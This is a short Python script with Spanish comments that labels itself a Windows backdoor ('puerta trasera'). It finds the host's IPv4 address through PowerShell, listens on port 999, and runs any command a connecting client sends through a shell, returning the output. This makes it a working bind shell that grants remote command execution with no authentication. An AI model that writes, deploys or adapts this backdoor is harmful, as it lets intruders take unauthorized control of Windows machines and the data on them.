import subprocess
import socket
import os
import re
import threading
import platform

# codigo para puerta trasera (solo windows)
# pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server

def IPV4():
    try:
        ip_info= subprocess.check_output([
        'powershell','-command','Get-NetAdapter','-Physical','|','powershell','-command','Get-NetIPConfiguration'],
        text=True
        )
        return re.search(r'ipv4address\s+:\s(\d+.\d+.\d+.\d+)',ip_info.lower()).group(1)

    except:
        print('error obteniendo ipv4')
        exit(1)

def escucha(cliente):
    try:
        señal = cliente.recv(1024).decode().lower().split(' ')
        if señal[0] == 'cd':
            try:
                os.chdir(señal[-1])
                cliente.send(f'[!] nueva ruta>> {señal[-1]}\n'.encode())
            except:
                cliente.send('\n[!] error cambiando el directorio de trabajo\n'.encode())
        else:
            comando = subprocess.check_output(señal,text=True,shell=True)
            cliente.send(comando.encode())
    except ConnectionResetError:
        main()
    except:
        cliente.send('\n[!] error durante la ejecucion del comando\n'.encode())

def main():

    

    n = 0
    while ejecucion:
        try:
            

            s.listen()
            cliente,sv=s.accept()
            if n == 0:
                print('\n[*] conectado\n')
            threading.Thread(target=escucha,args=(cliente,)).start()

        except Exception as e:
            cliente.send(f'\n[!] no se pudo procesar el comando {e})\n'.encode())
            main()
        finally:
            n=1

if __name__ == '__main__' and platform.system() == 'Windows':
    puerto = 999
    ip = IPV4()
    s = socket.socket()
    s.bind((ip,puerto))
    ejecucion = True
    try:
        main()
    except Exception as e:
        os.system(f'msg * hubo un error: {e}')
        exit(0)